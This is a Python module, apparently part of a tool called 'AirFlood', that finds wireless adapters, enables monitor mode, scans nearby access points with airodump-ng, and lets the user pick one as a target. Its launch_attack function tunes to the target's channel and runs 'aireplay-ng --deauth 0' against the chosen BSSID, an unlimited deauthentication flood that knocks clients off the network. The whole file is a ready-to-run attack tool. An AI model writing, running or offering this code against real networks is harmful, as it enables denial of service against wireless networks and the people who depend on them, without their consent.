import subprocess
import os
import csv
import time
import shutil
from datetime import datetime

from utils import banner

active_wireless_network = []


def check_for_essid(essid, lst):
    if not essid:
        return False
    if len(lst) == 0:
        return True
    for item in lst:
        if essid in (item["ESSID"] or ""):
            return False
    return True


def backup_stray_csv_files():
    if not any(".csv" in f for f in os.listdir()):
        return
    banner.info("archiving scan .csv files to backup_files/")
    directory = os.getcwd()
    try:
        os.mkdir(directory + "/backup_files")
    except FileExistsError:
        pass
    for file in os.listdir():
        if ".csv" in file:
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            shutil.move(file, f"{directory}/backup_files/{timestamp}-{file}")


def detect_wireless_interfaces():
    # parse iwconfig's actual per-interface blocks instead of assuming a
    # "wlan0"-style name — udev-assigned names (e.g. wlx00c0ca8a1234 for USB
    # adapters) and non-wireless interfaces listed before it (eth0, lo, ...)
    # would otherwise cause a real adapter to go undetected
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    interfaces = []
    for block in result.stdout.split("\n\n"):
        block = block.strip()
        if not block or "no wireless extensions" in block:
            continue
        name = block.splitlines()[0].split()[0]
        interfaces.append(name)
    return interfaces


def select_interface():
    banner.module_banner("wifi")
    banner.section("select a wireless interface", accent=banner.C.CYAN)

    interfaces = detect_wireless_interfaces()
    if len(interfaces) == 0:
        banner.error("no wireless adapter found, please connect one and try again")
        raise banner.BackToMenu()

    print()
    for index, item in enumerate(interfaces, start=1):
        print(f"  {banner.C.CYAN}[{index}]{banner.C.RESET} {item}")
    print(f"  {banner.C.CYAN}[q]{banner.C.RESET} back to AirFlood menu")

    while True:
        choice = banner.prompt("interface", accent=banner.C.CYAN)
        if choice.lower() in ("q", "b"):
            raise banner.BackToMenu()
        try:
            index = int(choice) - 1
            if index < 0:
                raise IndexError
            return interfaces[index]
        except (ValueError, IndexError):
            banner.warn("invalid selection, try again")


def prepare_monitor_mode(interface):
    banner.module_banner("wifi")
    banner.section("preparing monitor mode", accent=banner.C.CYAN)
    banner.info(f"killing conflicting processes on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    banner.info(f"enabling monitor mode on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "start", interface])
    banner.ok("monitor mode ready")
    time.sleep(1)


SCAN_DURATION = 30  # seconds


def _render_scan_screen(elapsed, tick):
    banner.module_banner("wifi")
    banner.section("scanning for access points", accent=banner.C.CYAN)

    # the bar itself has to shrink on a narrow terminal, and the surrounding
    # stats go on their own line — otherwise this row is a fixed ~50+ chars
    # regardless of how narrow the real terminal is, and it wraps mid-word
    bar_width = max(10, min(32, banner.width() - 20))
    spin = banner.spinner_frame(tick, accent=banner.C.CYAN)
    bar = banner.progress_bar(elapsed, SCAN_DURATION, bar_width=bar_width, accent=banner.C.CYAN)
    remaining = max(0, round(SCAN_DURATION - elapsed))

    print(f"  {spin}  {bar}")
    print(f"  {remaining:>2}s left  ·  {len(active_wireless_network)} access point(s) found")
    banner.info("press ctrl+c to stop early")


def _render_results_screen():
    banner.module_banner("wifi")
    banner.section("access points found", accent=banner.C.CYAN)
    print(f"  {'no':<4}{'bssid':<20}{'ch':<6}{'essid'}")
    print(f"  {'--':<4}{'-----':<20}{'--':<6}{'-----'}")
    for index, item in enumerate(active_wireless_network):
        print(f"  {index:<4}{item['BSSID']:<20}{item['channel'].strip():<6}{item['ESSID']}")


def scan_networks(interface):
    fieldnames = ["BSSID", "First_time_seen", "Last_time_seen", "channel", "Speed", "Privacy",
                  "Cipher", "Authentication", "Power", "beacons", "IV", "LAN_IP", "ID_length",
                  "ESSID", "Key"]

    scan_proc = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv",
         interface + "mon"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    start = time.monotonic()
    tick = 0

    try:
        while True:
            elapsed = time.monotonic() - start

            for file in os.listdir():
                if ".csv" in file:
                    with open(file) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] in (None, "BSSID"):
                                continue
                            if check_for_essid(row["ESSID"], active_wireless_network):
                                active_wireless_network.append(row)

            _render_scan_screen(elapsed, tick)
            tick += 1

            if elapsed >= SCAN_DURATION:
                break

            # sudo runs airodump-ng in its own pty, so a ctrl+c can stop that
            # child on its own — if it's already gone, stop here too instead
            # of waiting out the rest of the timer for nothing
            if scan_proc.poll() is not None:
                banner.warn("scan process stopped early, showing results so far")
                break

            time.sleep(0.4)
    except KeyboardInterrupt:
        pass
    finally:
        if scan_proc.poll() is None:
            scan_proc.terminate()

    _render_results_screen()
    banner.ok(f"scan complete, found {len(active_wireless_network)} network(s)")


def select_target():
    while True:
        choice = banner.prompt("target", accent=banner.C.CYAN)
        try:
            return active_wireless_network[int(choice)]
        except (ValueError, IndexError):
            banner.warn("invalid selection, try again")


def launch_attack(interface, target):
    banner.module_banner("wifi")
    banner.section("launching deauthentication attack", accent=banner.C.CYAN)
    channel = target["channel"].strip()
    bssid = target["BSSID"]
    mon_interface = interface + "mon"

    print(f"  target essid  : {target['ESSID']}")
    print(f"  target bssid  : {bssid}")
    print(f"  channel       : {channel}")
    banner.countdown(3, "attacking")

    # tune the monitor interface to the target's channel before deauthing,
    # otherwise aireplay-ng listens on whatever channel it was last left on
    # and never sees the target's beacon frames
    subprocess.run(["sudo", "iwconfig", mon_interface, "channel", channel])
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface])


def run():
    backup_stray_csv_files()
    try:
        interface = select_interface()
        prepare_monitor_mode(interface)
        scan_networks(interface)
        target = select_target()
        launch_attack(interface, target)
    finally:
        # always sweep up this run's airodump-ng .csv files, whether the attack
        # finished, was interrupted, or errored out
        backup_stray_csv_files()


if __name__ == "__main__":
    try:
        run()
    except banner.BackToMenu:
        banner.info("bye.")
    except KeyboardInterrupt:
        print()
        banner.warn("aborted")
